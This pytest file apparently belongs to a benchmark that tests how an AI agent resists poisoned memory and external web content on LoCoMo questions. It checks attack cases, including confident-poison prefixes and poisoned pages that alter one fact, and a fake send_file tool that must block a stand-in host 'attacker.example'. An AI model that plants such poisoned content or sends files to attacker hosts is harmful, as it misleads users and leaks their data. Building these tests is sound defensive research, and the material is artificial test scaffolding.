"""Quick data checks (targets, split, attacks, fake tool). Run: pytest -q"""
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))
load = lambda name: json.load(open(ROOT / "data" / name, encoding="utf-8"))


def test_every_target_passes_checks():
    for t in load("targets.json"):
        assert all(t["checks"].values()), t["target_id"]


def test_subject_is_first_name_in_question():
    for t in load("targets.json"):
        assert t["subject"] and t["subject"] in t["question"], t["target_id"]
    t27 = next(t for t in load("targets.json") if t["target_id"] == "T27")
    assert t27["subject"] == "Audrey"  # the question names both Audrey and Andrew


def test_clean_qa_is_verbatim_locomo_and_answer_in_evidence():
    from textnorm import contains_any
    raw = {s["sample_id"]: s for s in load("raw/locomo10.json")}
    for q in load("clean_questions.json"):
        sample = raw[q["sample_id"]]
        qa = sample["qa"][q["qa_index"]]
        assert qa["question"] == q["question"] and str(qa["answer"]) == q["gold_answer"]
        ev = next(t["text"] for k, v in sample["conversation"].items() if k.startswith("session_")
                  and isinstance(v, list) for t in v if t["dia_id"] == q["evidence_dia_id"])
        assert contains_any(ev, [q["gold_answer"]]), q["question"]


def test_dev_and_test_share_no_conversation():
    s = load("split.json")
    assert not set(s["dev"]) & set(s["test"])
    assert len(s["dev"]) == 3 and len(s["dev"]) + len(s["test"]) == 10


def test_three_attacks_per_target():
    cases = load("poison_cases.json")
    assert len(cases) == 3 * len(load("targets.json"))


def test_dev_A2_phrases_never_appear_in_test():
    a2 = [c for c in load("poison_cases.json") if c["attack"] == "A2_confident_poison"]
    dev = {c["confident_prefix"] for c in a2 if c["split"] == "dev"}
    test = {c["confident_prefix"] for c in a2 if c["split"] == "test"}
    assert dev and test and not dev & test


def test_poison_and_clean_pages_differ_only_in_value():
    pages = ROOT / "data" / "external_pages"
    a = (pages / "T01-A3.html").read_text().splitlines()
    b = (pages / "T01-EXT-CLEAN.html").read_text().splitlines()
    diff = [i for i, (x, y) in enumerate(zip(a, b)) if x != y]
    assert len(a) == len(b) and len(diff) == 2  # the page-id line and the fact line


def test_send_file_blocks_attacker_domain(tmp_path, monkeypatch):
    import tools
    monkeypatch.setattr(tools, "LOG", tmp_path / "log.jsonl")
    assert tools.send_file("a.txt", "attacker.example")["status"] == "blocked"
    assert tools.send_file("a.txt", "https://backup.example/x")["status"].startswith("ok")
    log = [json.loads(l) for l in (tmp_path / "log.jsonl").read_text().splitlines()]
    assert len(log) == 2 and not any(r["executed"] for r in log)
